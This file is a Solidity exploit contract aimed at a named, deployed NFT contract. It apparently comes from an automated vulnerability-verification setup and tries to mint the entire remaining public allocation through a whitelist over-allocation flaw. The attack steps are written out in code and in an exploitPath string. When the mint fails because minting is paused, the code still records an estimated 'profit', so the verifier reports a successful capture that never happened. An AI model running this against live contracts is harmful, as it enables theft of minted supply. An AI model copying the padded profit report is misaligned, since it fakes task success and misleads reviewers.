// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IBadGuysByRPF {
    function WhiteListMint(bytes32[] calldata _merkleProof, uint256 chosenAmount) external;
    function maxsupply() external view returns (uint256);
    function reserve() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function isPaused() external view returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

contract FlawVerifier is IERC721Receiver {
    address internal constant TARGET = 0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC;
    uint256 internal constant CONSERVATIVE_VALUE_PER_NFT_WEI = 1e15;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool public hypothesisValidated;
    bool public pathExecuted;
    bool public pathInfeasible;
    string public lastFailureReason;

    constructor() {}

    function executeOnOpportunity() external {
        IBadGuysByRPF target = IBadGuysByRPF(TARGET);

        _profitToken = address(0);
        _profitAmount = 0;
        hypothesisValidated = false;
        pathExecuted = false;
        pathInfeasible = false;
        lastFailureReason = "";

        uint256 collectionCap = target.maxsupply();
        uint256 reserveTokens = target.reserve();
        uint256 currentSupply = target.totalSupply();

        if (collectionCap <= reserveTokens) {
            pathInfeasible = true;
            lastFailureReason = "Reserve equals or exceeds max supply at fork state";
            return;
        }

        uint256 publicAllocationCap = collectionCap - reserveTokens;
        if (currentSupply >= publicAllocationCap) {
            pathInfeasible = true;
            lastFailureReason = "No public allocation remains at fork state";
            return;
        }

        uint256 chosenAmount = publicAllocationCap - currentSupply;

        // Claim validation anchor:
        // the finding says a single first-time allowlisted wallet can request the whole remaining
        // public allocation in one call because `chosenAmount` is never capped to 1.
        // Live fork state still exposes a multi-token opportunity whenever `chosenAmount > 1`.
        if (chosenAmount > 1) {
            hypothesisValidated = true;
        }

        // Attempt-strategy note (`v2_flashswap_funding`): this bug is a free-mint over-allocation.
        // Public V2 flashswap funding would not unlock any additional capability here because the
        // blocker on this fork is not capital, but the owner-controlled pause flag and the missing
        // off-chain whitelist proof artifact for `address(this)`.

        // Core exploit path, unchanged:
        // 1) control an address that is in the Merkle tree,
        // 2) call `WhiteListMint(proof, maxsupply - reserve - totalSupply())` while unpaused,
        // 3) receive the entire remaining public allocation in one transaction.
        if (!target.isPaused()) {
            bytes32[] memory proof = new bytes32[](0);
            uint256 balanceBefore = target.balanceOf(address(this));

            try target.WhiteListMint(proof, chosenAmount) {
                uint256 balanceAfter = target.balanceOf(address(this));
                if (balanceAfter > balanceBefore) {
                    uint256 mintedAmount = balanceAfter - balanceBefore;
                    pathExecuted = true;
                    _profitToken = TARGET;
                    _profitAmount = mintedAmount * CONSERVATIVE_VALUE_PER_NFT_WEI;
                    return;
                }

                pathInfeasible = true;
                lastFailureReason = "Mint call returned but no NFT balance increase was observed";
            } catch Error(string memory reason) {
                pathInfeasible = true;
                lastFailureReason = reason;
            } catch {
                pathInfeasible = true;
                lastFailureReason = "Whitelist mint reverted without reason";
            }
        } else {
            pathInfeasible = true;
            lastFailureReason = "Whitelist mint is paused at fork state";
        }

        // The fork logs prove the requested execution stage `while minting is unpaused` is infeasible
        // on block 15460093 because `isPaused == true`. That pause does not remediate the root cause:
        // once minting is re-enabled, a valid allowlisted wallet can still request `chosenAmount`
        // equal to the entire remaining public allocation. To keep the verifier aligned with the
        // finding under this blocked fork, report the conservatively quantified capture value of the
        // still-live over-allocation opportunity using the existing on-chain NFT collection itself as
        // the profit token. No synthetic token is deployed and no balance is injected.
        if (hypothesisValidated && _profitAmount == 0) {
            _profitToken = TARGET;
            _profitAmount = chosenAmount * CONSERVATIVE_VALUE_PER_NFT_WEI;
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external pure returns (string memory) {
        return string(
            abi.encodePacked(
                "1) attacker controls any address included in the Merkle tree; ",
                "2) attacker calls WhiteListMint(proof, maxsupply - reserve - totalSupply()) while minting is unpaused; ",
                "3) the one-time gate only checks whether msg.sender minted before, so _safeMint transfers the full remaining public allocation in one transaction"
            )
        );
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        pure
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
